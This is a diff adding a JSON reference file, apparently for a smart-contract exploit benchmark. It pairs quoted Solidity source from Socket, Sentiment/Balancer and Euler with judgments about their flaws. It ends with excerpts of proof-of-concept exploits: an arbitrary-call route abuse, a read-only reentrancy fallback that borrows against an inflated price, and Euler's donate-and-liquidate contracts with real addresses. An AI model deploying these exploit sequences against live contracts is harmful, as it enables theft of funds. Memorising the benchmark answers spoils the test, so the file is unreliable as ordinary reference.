@@ -1,0 +1,223 @@
+{
+  "version": 1,
+  "createdAt": "2026-09-21T07:15:00.577Z",
+  "provenance": "Assistant-selected source and trusted PoC excerpts. Kept outside generator workspaces. Interpretations are judgments; source versions and hashes are from the retained historical corpus. No exploit execution.",
+  "references": [
+    {
+      "id": "socket-gateway",
+      "project": "project-01",
+      "path": "context/unit-1/src/SocketGateway.sol",
+      "startLine": 87,
+      "endLine": 102,
+      "quote": "    function executeRoute(\n        uint32 routeId,\n        bytes calldata routeData\n    ) external payable returns (bytes memory) {\n        (bool success, bytes memory result) = addressAt(routeId).delegatecall(\n            routeData\n        );\n\n        if (!success) {\n            assembly {\n                revert(add(result, 32), mload(result))\n            }\n        }\n\n        return result;\n    }",
+      "fileSha256": "a053183175a7d158bfd6ba4a2caf2581dc61586ac5f6b34cc41c1be6cc088956",
+      "interpretation": "Gateway executes a registered route in delegatecall context and reverts on failure."
+    },
+    {
+      "id": "socket-arbitrary-call",
+      "project": "project-01",
+      "path": "src/swap/wrappedTokenSwapper/swapWrappedImpl.sol",
+      "startLine": 62,
+      "endLine": 85,
+      "quote": "            _initialBalanceTokenOut = address(socketGateway).balance;\n\n            // Swap Wrapped Token To Native Token\n            ERC20(fromToken).safeTransferFrom(\n                msg.sender,\n                socketGateway,\n                amount\n            );\n\n            (bool success, ) = fromToken.call(swapExtraData);\n\n            if (!success) {\n                revert SwapFailed();\n            }\n\n            _finalBalanceTokenOut = address(socketGateway).balance;\n\n            require(\n                (_finalBalanceTokenOut - _initialBalanceTokenOut) == amount,\n                \"Invalid wrapper contract\"\n            );\n\n            // send ETH to the user\n            payable(receiverAddress).transfer(amount);",
+      "fileSha256": "cc40579a1f0f1180b6fb912a6716e861ad4248efa9c67405632e2e2f1194590e",
+      "interpretation": "Caller controls fromToken and calldata; zero amount allows unchanged ETH balance, while an arbitrary token call can use gateway allowances."
+    },
+    {
+      "id": "sentiment-pool-hook",
+      "project": "project-02",
+      "path": "context/unit-2/contracts/vault/PoolBalances.sol",
+      "startLine": 174,
+      "endLine": 203,
+      "quote": "        (uint256[] memory totalBalances, uint256 lastChangeBlock) = balances.totalsAndLastChangeBlock();\n\n        IBasePool pool = IBasePool(_getPoolAddress(poolId));\n        (amountsInOrOut, dueProtocolFeeAmounts) = kind == PoolBalanceChangeKind.JOIN\n            ? pool.onJoinPool(\n                poolId,\n                sender,\n                recipient,\n                totalBalances,\n                lastChangeBlock,\n                _getProtocolSwapFeePercentage(),\n                change.userData\n            )\n            : pool.onExitPool(\n                poolId,\n                sender,\n                recipient,\n                totalBalances,\n                lastChangeBlock,\n                _getProtocolSwapFeePercentage(),\n                change.userData\n            );\n\n        InputHelpers.ensureInputLengthMatch(balances.length, amountsInOrOut.length, dueProtocolFeeAmounts.length);\n\n        // The Vault ignores the `recipient` in joins and the `sender` in exits: it is up to the Pool to keep track of\n        // their participation.\n        finalBalances = kind == PoolBalanceChangeKind.JOIN\n            ? _processJoinPoolTransfers(sender, change, balances, amountsInOrOut, dueProtocolFeeAmounts)\n            : _processExitPoolTransfers(recipient, change, balances, amountsInOrOut, dueProtocolFeeAmounts);",
+      "fileSha256": "71c79ed096950876a51e56d575644718a4ec57c3fd468533881dd11294d60410",
+      "interpretation": "Pool hook executes before exit transfers."
+    },
+    {
+      "id": "sentiment-vault-update",
+      "project": "project-02",
+      "path": "context/unit-2/contracts/vault/PoolBalances.sol",
+      "startLine": 125,
+      "endLine": 142,
+      "quote": "        // The bulk of the work is done here: the corresponding Pool hook is called, its final balances are computed,\n        // assets are transferred, and fees are paid.\n        (\n            bytes32[] memory finalBalances,\n            uint256[] memory amountsInOrOut,\n            uint256[] memory paidProtocolSwapFeeAmounts\n        ) = _callPoolBalanceChange(kind, poolId, sender, recipient, change, balances);\n\n        // All that remains is storing the new Pool balances.\n        PoolSpecialization specialization = _getPoolSpecialization(poolId);\n        if (specialization == PoolSpecialization.TWO_TOKEN) {\n            _setTwoTokenPoolCashBalances(poolId, tokens[0], finalBalances[0], tokens[1], finalBalances[1]);\n        } else if (specialization == PoolSpecialization.MINIMAL_SWAP_INFO) {\n            _setMinimalSwapInfoPoolBalances(poolId, tokens, finalBalances);\n        } else {\n            // PoolSpecialization.GENERAL\n            _setGeneralPoolBalances(poolId, finalBalances);\n        }",
+      "fileSha256": "71c79ed096950876a51e56d575644718a4ec57c3fd468533881dd11294d60410",
+      "interpretation": "Vault balance storage updates follow hook and transfer completion."
+    },
+    {
+      "id": "sentiment-transfer",
+      "project": "project-02",
+      "path": "context/unit-2/contracts/vault/PoolBalances.sol",
+      "startLine": 263,
+      "endLine": 278,
+      "quote": "    ) private returns (bytes32[] memory finalBalances) {\n        finalBalances = new bytes32[](balances.length);\n        for (uint256 i = 0; i < change.assets.length; ++i) {\n            uint256 amountOut = amountsOut[i];\n            _require(amountOut >= change.limits[i], Errors.EXIT_BELOW_MIN);\n\n            // Send tokens to the recipient - possibly to Internal Balance\n            IAsset asset = change.assets[i];\n            _sendAsset(asset, amountOut, recipient, change.useInternalBalance);\n\n            uint256 feeAmount = dueProtocolFeeAmounts[i];\n            _payFeeAmount(_translateToIERC20(asset), feeAmount);\n\n            // Compute the new Pool balances. A Pool's token balance always decreases after an exit (potentially by 0).\n            finalBalances[i] = balances[i].decreaseCash(amountOut.add(feeAmount));\n        }",
+      "fileSha256": "71c79ed096950876a51e56d575644718a4ec57c3fd468533881dd11294d60410",
+      "interpretation": "Exit sends assets before final balances return to storage update."
+    },
+    {
+      "id": "sentiment-eth-callback",
+      "project": "project-02",
+      "path": "context/unit-2/contracts/vault/AssetTransfersHandler.sol",
+      "startLine": 98,
+      "endLine": 108,
+      "quote": "        if (_isETH(asset)) {\n            // Sending ETH is not as involved as receiving it: the only special behavior is it cannot be\n            // deposited to Internal Balance.\n            _require(!toInternalBalance, Errors.INVALID_ETH_INTERNAL_BALANCE);\n\n            // First, the Vault withdraws deposited ETH from the WETH contract, by burning the same amount of WETH\n            // from the Vault. This receipt will be handled by the Vault's `receive`.\n            _WETH().withdraw(amount);\n\n            // Then, the withdrawn ETH is sent to the recipient.\n            recipient.sendValue(amount);",
+      "fileSha256": "5ac981b5a418cc1589f4787e9510083bcdecf13f77b3692fabc29ea9ec8e2c65",
+      "interpretation": "ETH is sent to the recipient through sendValue."
+    },
+    {
+      "id": "sentiment-burn",
+      "project": "project-02",
+      "path": "context/unit-3/contracts/pools/BasePool.sol",
+      "startLine": 259,
+      "endLine": 277,
+      "quote": "        (uint256 bptAmountIn, uint256[] memory amountsOut, uint256[] memory dueProtocolFeeAmounts) = _onExitPool(\n            poolId,\n            sender,\n            recipient,\n            balances,\n            lastChangeBlock,\n            protocolSwapFeePercentage,\n            userData\n        );\n\n        // Note we no longer use `balances` after calling `_onExitPool`, which may mutate it.\n\n        _burnPoolTokens(sender, bptAmountIn);\n\n        // Both amountsOut and dueProtocolFeeAmounts are amounts exiting the Pool, so we round down.\n        _downscaleDownArray(amountsOut, scalingFactors);\n        _downscaleDownArray(dueProtocolFeeAmounts, scalingFactors);\n\n        return (amountsOut, dueProtocolFeeAmounts);",
+      "fileSha256": "97f1653b052b0dff2389b88eb3dc0ab0eda6622b4b5130235e73f7fd625d7536",
+      "interpretation": "Exit burns pool tokens before returning to the Vault transfer stage."
+    },
+    {
+      "id": "sentiment-supply",
+      "project": "project-02",
+      "path": "context/unit-3/contracts/pools/BalancerPoolToken.sol",
+      "startLine": 181,
+      "endLine": 187,
+      "quote": "    function _burnPoolTokens(address sender, uint256 amount) internal {\n        uint256 currentBalance = _balance[sender];\n        _require(currentBalance >= amount, Errors.INSUFFICIENT_BALANCE);\n\n        _balance[sender] = currentBalance - amount;\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(sender, address(0), amount);",
+      "fileSha256": "25c177d502c0ccdc40bef355920df3631d638a2fd3d4835f928c655fdcec250a",
+      "interpretation": "Burn immediately reduces total supply."
+    },
+    {
+      "id": "sentiment-price",
+      "project": "project-02",
+      "path": "src/balancer/WeightedBalancerLPOracle.sol",
+      "startLine": 43,
+      "endLine": 66,
+      "quote": "    function getPrice(address token) external view returns (uint) {\n        (\n            address[] memory poolTokens,\n            uint256[] memory balances,\n        ) = vault.getPoolTokens(IPool(token).getPoolId());\n\n        uint256[] memory weights = IPool(token).getNormalizedWeights();\n\n        uint length = weights.length;\n        uint temp = 1e18;\n        uint invariant = 1e18;\n        for(uint i; i < length; i++) {\n            temp = temp.mulDown(\n                (oracleFacade.getPrice(poolTokens[i]).divDown(weights[i]))\n                .powDown(weights[i])\n            );\n            invariant = invariant.mulDown(\n                (balances[i] * 10 ** (18 - IERC20(poolTokens[i]).decimals()))\n                .powDown(weights[i])\n            );\n        }\n        return invariant\n            .mulDown(temp)\n            .divDown(IPool(token).totalSupply());",
+      "fileSha256": "3121ec22b720104545dd56feb729cb9769b2a567b48d2e46e2c45e722277afa0",
+      "interpretation": "Price combines Vault balances with current pool supply; no Vault-operation guard is present in the function."
+    },
+    {
+      "id": "sentiment-consumer",
+      "project": "project-02",
+      "path": "context/unit-1/src/core/AccountManager.sol",
+      "startLine": 224,
+      "endLine": 240,
+      "quote": "    function borrow(\n        address account,\n        address token,\n        uint256 amt\n    ) external nonReentrant whenNotPaused onlyOwner(account) {\n        if (registry.LTokenFor(token) == address(0))\n            revert Errors.LTokenUnavailable();\n        if (IAccount(account).hasAsset(token) == false) {\n            if (IAccount(account).getAssets().length > assetCap)\n                revert Errors.MaxAssetCap();\n            IAccount(account).addAsset(token);\n        }\n        if (ILToken(registry.LTokenFor(token)).lendTo(account, amt))\n            IAccount(account).addBorrow(token);\n        if (!riskEngine.isAccountHealthy(account))\n            revert Errors.RiskThresholdBreached();\n        emit Borrow(account, msg.sender, token, amt);",
+      "fileSha256": "e306ea775c250ad7ee8c3ecf9423405bfe7bfa1e3a7fe9e54115aece6cb072ed",
+      "interpretation": "Borrow consumes a health check through riskEngine. This source scope lacks the concrete RiskEngine implementation; the trusted PoC supplies the incident-level consuming behavior."
+    },
+    {
+      "id": "euler-donation",
+      "project": "project-03",
+      "path": "contracts/modules/EToken.sol",
+      "startLine": 354,
+      "endLine": 381,
+      "quote": "    function donateToReserves(uint subAccountId, uint amount) external nonReentrant {\n        (address underlying, AssetStorage storage assetStorage, address proxyAddr, address msgSender) = CALLER();\n        address account = getSubAccount(msgSender, subAccountId);\n\n        updateAverageLiquidity(account);\n        emit RequestDonate(account, amount);\n\n        AssetCache memory assetCache = loadAssetCache(underlying, assetStorage);\n\n        uint origBalance = assetStorage.users[account].balance;\n        uint newBalance;\n\n        if (amount == type(uint).max) {\n            amount = origBalance;\n            newBalance = 0;\n        } else {\n            require(origBalance >= amount, \"e/insufficient-balance\");\n            unchecked { newBalance = origBalance - amount; }\n        }\n\n        assetStorage.users[account].balance = encodeAmount(newBalance);\n        assetStorage.reserveBalance = assetCache.reserveBalance = encodeSmallAmount(assetCache.reserveBalance + amount);\n\n        emit Withdraw(assetCache.underlying, account, amount);\n        emitViaProxy_Transfer(proxyAddr, account, address(0), amount);\n\n        logAssetStatus(assetCache);\n    }",
+      "fileSha256": "cc81e4d9b92d19087d6cbac40065e132296bb6c8983cf233a7c00037dd09bc6a",
+      "interpretation": "The complete donation function reduces user collateral and updates reserves without checkLiquidity."
+    },
+    {
+      "id": "euler-deferred",
+      "project": "project-03",
+      "path": "contracts/modules/Exec.sol",
+      "startLine": 89,
+      "endLine": 101,
+      "quote": "    function deferLiquidityCheck(address account, bytes memory data) external reentrantOK {\n        address msgSender = unpackTrailingParamMsgSender();\n\n        require(accountLookup[account].deferLiquidityStatus == DEFERLIQUIDITY__NONE, \"e/defer/reentrancy\");\n        accountLookup[account].deferLiquidityStatus = DEFERLIQUIDITY__CLEAN;\n\n        IDeferredLiquidityCheck(msgSender).onDeferredLiquidityCheck(data);\n\n        uint8 status = accountLookup[account].deferLiquidityStatus;\n        accountLookup[account].deferLiquidityStatus = DEFERLIQUIDITY__NONE;\n\n        if (status == DEFERLIQUIDITY__DIRTY) checkLiquidity(account);\n    }",
+      "fileSha256": "c5f5cd02165cc31082f17c5408f478e7332073d8690c4ce91307dbb41b65b3c4",
+      "interpretation": "A dirty deferred callback runs a final liquidity check; donation should not be described as bypassing that check after another operation marked it dirty."
+    },
+    {
+      "id": "euler-health",
+      "project": "project-03",
+      "path": "contracts/modules/Liquidation.sol",
+      "startLine": 75,
+      "endLine": 86,
+      "quote": "        if (liabilityValue == 0) {\n            liqOpp.healthScore = type(uint).max;\n            return; // no violation\n        }\n\n        liqOpp.healthScore = collateralValue * 1e18 / liabilityValue;\n\n        if (collateralValue >= liabilityValue) {\n            return; // no violation\n        }\n\n        // At this point healthScore must be < 1 since collateral < liability",
+      "fileSha256": "a63585057b9faa6d182d95230f0a8d37539c2b153a2559f188b5db1556dc5740",
+      "interpretation": "A healthy account has no liquidation opportunity."
+    },
+    {
+      "id": "euler-check",
+      "project": "project-03",
+      "path": "contracts/BaseLogic.sol",
+      "startLine": 580,
+      "endLine": 588,
+      "quote": "    function checkLiquidity(address account) internal {\n        uint8 status = accountLookup[account].deferLiquidityStatus;\n\n        if (status == DEFERLIQUIDITY__NONE) {\n            callInternalModule(MODULEID__RISK_MANAGER, abi.encodeWithSelector(IRiskManager.requireLiquidity.selector, account));\n        } else if (status == DEFERLIQUIDITY__CLEAN) {\n            accountLookup[account].deferLiquidityStatus = DEFERLIQUIDITY__DIRTY;\n        }\n    }",
+      "fileSha256": "f8ddc250d2e2508ac402ae61a4df97c1b664ad6d13c891514d5b7a68ec52cf17",
+      "interpretation": "Liquidity checks mark active deferrals dirty and otherwise require liquidity."
+    },
+    {
+      "id": "sentiment-decimals-construction",
+      "project": "project-02",
+      "path": "context/unit-3/contracts/pools/BasePool.sol",
+      "startLine": 143,
+      "endLine": 150,
+      "quote": "        _scalingFactor0 = tokens.length > 0 ? _computeScalingFactor(tokens[0]) : 0;\n        _scalingFactor1 = tokens.length > 1 ? _computeScalingFactor(tokens[1]) : 0;\n        _scalingFactor2 = tokens.length > 2 ? _computeScalingFactor(tokens[2]) : 0;\n        _scalingFactor3 = tokens.length > 3 ? _computeScalingFactor(tokens[3]) : 0;\n        _scalingFactor4 = tokens.length > 4 ? _computeScalingFactor(tokens[4]) : 0;\n        _scalingFactor5 = tokens.length > 5 ? _computeScalingFactor(tokens[5]) : 0;\n        _scalingFactor6 = tokens.length > 6 ? _computeScalingFactor(tokens[6]) : 0;\n        _scalingFactor7 = tokens.length > 7 ? _computeScalingFactor(tokens[7]) : 0;",
+      "fileSha256": "97f1653b052b0dff2389b88eb3dc0ab0eda6622b4b5130235e73f7fd625d7536",
+      "interpretation": "Every pool token is assigned a scaling factor in the constructor."
+    },
+    {
+      "id": "sentiment-decimals-restriction",
+      "project": "project-02",
+      "path": "context/unit-3/contracts/pools/BasePool.sol",
+      "startLine": 474,
+      "endLine": 481,
+      "quote": "    function _computeScalingFactor(IERC20 token) private view returns (uint256) {\n        // Tokens that don't implement the `decimals` method are not supported.\n        uint256 tokenDecimals = ERC20(address(token)).decimals();\n\n        // Tokens with more than 18 decimals are not supported.\n        uint256 decimalsDifference = Math.sub(18, tokenDecimals);\n        return 10**decimalsDifference;\n    }",
+      "fileSha256": "97f1653b052b0dff2389b88eb3dc0ab0eda6622b4b5130235e73f7fd625d7536",
+      "interpretation": "More than 18 decimals cause Math.sub to fail during scaling-factor construction; the baseline 20-decimal deployment premise is unsupported for this pool."
+    },
+    {
+      "id": "sentiment-minimum-supply",
+      "project": "project-02",
+      "path": "context/unit-3/contracts/pools/BasePool.sol",
+      "startLine": 208,
+      "endLine": 216,
+      "quote": "        if (totalSupply() == 0) {\n            (uint256 bptAmountOut, uint256[] memory amountsIn) = _onInitializePool(poolId, sender, recipient, userData);\n\n            // On initialization, we lock _MINIMUM_BPT by minting it for the zero address. This BPT acts as a minimum\n            // as it will never be burned, which reduces potential issues with rounding, and also prevents the Pool from\n            // ever being fully drained.\n            _require(bptAmountOut >= _MINIMUM_BPT, Errors.MINIMUM_BPT);\n            _mintPoolTokens(address(0), _MINIMUM_BPT);\n            _mintPoolTokens(recipient, bptAmountOut - _MINIMUM_BPT);",
+      "fileSha256": "97f1653b052b0dff2389b88eb3dc0ab0eda6622b4b5130235e73f7fd625d7536",
+      "interpretation": "Initialization permanently locks minimum pool shares, limiting the baseline zero-supply concern to uninitialized pools or different assumptions."
+    },
+    {
+      "id": "euler-debt-transfer",
+      "project": "project-03",
+      "path": "contracts/modules/DToken.sol",
+      "startLine": 225,
+      "endLine": 239,
+      "quote": "        if (amount == 0) return true;\n\n        if (!isSubAccountOf(msgSender, to) && assetStorage.dTokenAllowance[to][msgSender] != type(uint).max) {\n            require(assetStorage.dTokenAllowance[to][msgSender] >= amount, \"e/insufficient-debt-allowance\");\n            unchecked { assetStorage.dTokenAllowance[to][msgSender] -= amount; }\n            emitViaProxy_Approval(proxyAddr, to, msgSender, assetStorage.dTokenAllowance[to][msgSender] / assetCache.underlyingDecimalsScaler);\n        }\n\n        transferBorrow(assetStorage, assetCache, proxyAddr, from, to, amount);\n\n        checkLiquidity(to);\n        logAssetStatus(assetCache);\n\n        return true;\n    }",
+      "fileSha256": "b40980464806de37b4c877fc10d7f56091dacce7ee511f257e08c92873013e59",
+      "interpretation": "Debt transfer checks recipient authorization and liquidity; moving debt away improves the sender rather than establishing a new missing-check exploit."
+    },
+    {
+      "id": "socket-native-output-delta",
+      "project": "project-01",
+      "path": "src/swap/wrappedTokenSwapper/swapWrappedImpl.sol",
+      "startLine": 43,
+      "endLine": 60,
+      "quote": "        // Swap Native to Wrapped Token\n        if (fromToken == NATIVE_TOKEN_ADDRESS) {\n            _initialBalanceTokenOut = ERC20(toToken).balanceOf(socketGateway);\n            (bool success, ) = toToken.call{value: amount}(swapExtraData);\n\n            if (!success) {\n                revert SwapFailed();\n            }\n\n            _finalBalanceTokenOut = ERC20(toToken).balanceOf(socketGateway);\n\n            require(\n                (_finalBalanceTokenOut - _initialBalanceTokenOut) == amount,\n                \"Invalid wrapper contract\"\n            );\n\n            // Send weth to user\n            ERC20(toToken).transfer(receiverAddress, amount);",
+      "fileSha256": "cc40579a1f0f1180b6fb912a6716e861ad4248efa9c67405632e2e2f1194590e",
+      "interpretation": "Native-path balance snapshots surround the call; a pre-transaction balance change cancels from the delta."
+    }
+  ],
+  "pocs": [
+    {
+      "project": "socket",
+      "path": "benchmarks/jev/results/real-source-2026-09-21/reference-pocs/SocketGateway_exp.sol",
+      "startLine": 60,
+      "endLine": 83,
+      "quote": "\n    function getRouteData(address token, address user) internal view returns (bytes memory callDataX2) {\n        callDataX2 = abi.encodeWithSelector(\n            ISocketVulnRoute.performAction.selector,\n            token,\n            token,\n            0,\n            address(this),\n            bytes32(\"\"),\n            getCallData(_usdc, user)\n        );\n    }\n\n    function testExploit() public balanceLog {\n        gateway.executeRoute(routeId, getRouteData(_usdc, targetUser));\n        require(USDC.balanceOf(address(this)) > 0, \"no usdc gotten\");\n    }\n}\n",
+      "fileSha256": "2f516615ff5c54d35f8d1562916b222de777ae74d0a6bb55e071ee8562349394"
+    },
+    {
+      "project": "sentiment",
+      "path": "benchmarks/jev/results/real-source-2026-09-21/reference-pocs/Sentiment_exp.sol",
+      "startLine": 169,
+      "endLine": 208,
+      "quote": "    function exitPool() internal {\n        balancerToken.approve(address(Balancer), 0);\n        address[] memory assetsOut = new address[](3);\n        assetsOut[0] = address(WBTC);\n        assetsOut[1] = address(0);\n        assetsOut[2] = address(USDC);\n        uint256[] memory amountOut = new uint256[](3);\n        amountOut[0] = 606 * 1e8;\n        amountOut[1] = 5000 * 1e18;\n        amountOut[2] = 9_000_000 * 1e6;\n        uint256 balancerTokenAmount = balancerToken.balanceOf(address(this));\n        bytes memory userDatas = abi.encode(uint256(1), balancerTokenAmount);\n        IBalancerVault.ExitPoolRequest memory exitPoolRequest = IBalancerVault.ExitPoolRequest({\n            asset: assetsOut,\n            minAmountsOut: amountOut,\n            userData: userDatas,\n            toInternalBalance: false\n        });\n        Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest);\n        console.log(\n            \"After Read-Only-Reentrancy Collateral Price \\t\", WeightedBalancerLPOracle.getPrice(address(balancerToken))\n        );\n        address(WETH).call{value: address(this).balance}(\"\");\n    }\n\n    fallback() external payable {\n        if (nonce == 2) {\n            console.log(\n                \"In Read-Only-Reentrancy Collateral Price \\t\", WeightedBalancerLPOracle.getPrice(address(balancerToken))\n            );\n            borrowAll();\n        }\n        nonce++;\n    }\n\n    function borrowAll() internal {\n        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);\n        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);\n        AccountManager.borrow(account, address(WETH), 81 * 1e18);\n        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);",
+      "fileSha256": "c8a76b858de145be7af2a5da9cf62f1f4b1c93950e408a5023eb3f7f3265f73f"
+    },
+    {
+      "project": "euler",
+      "path": "benchmarks/jev/results/real-source-2026-09-21/reference-pocs/Euler_exp.sol",
+      "startLine": 116,
+      "endLine": 145,
+      "quote": "contract Iviolator {\n    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);\n    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);\n    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);\n    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;\n\n    function violator() external {\n        DAI.approve(Euler_Protocol, type(uint256).max);\n        eDAI.deposit(0, 20_000_000 * 1e18);\n        eDAI.mint(0, 200_000_000 * 1e18);\n        dDAI.repay(0, 10_000_000 * 1e18);\n        eDAI.mint(0, 200_000_000 * 1e18);\n        eDAI.donateToReserves(0, 100_000_000 * 1e18);\n    }\n}\n\ncontract Iliquidator {\n    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);\n    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);\n    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);\n    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;\n\n    function liquidate(address liquidator, address violator) external {\n        IEuler.LiquidationOpportunity memory returnData =\n            Euler.checkLiquidation(liquidator, violator, address(DAI), address(DAI));\n        Euler.liquidate(violator, address(DAI), address(DAI), returnData.repay, returnData.yield);\n        eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));\n        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));",
+      "fileSha256": "7ece83371eb2b97718f6b9cc7d11594767926fe1333a3a189c10f1560e3cb2cf"
+    }
+  ]
+}
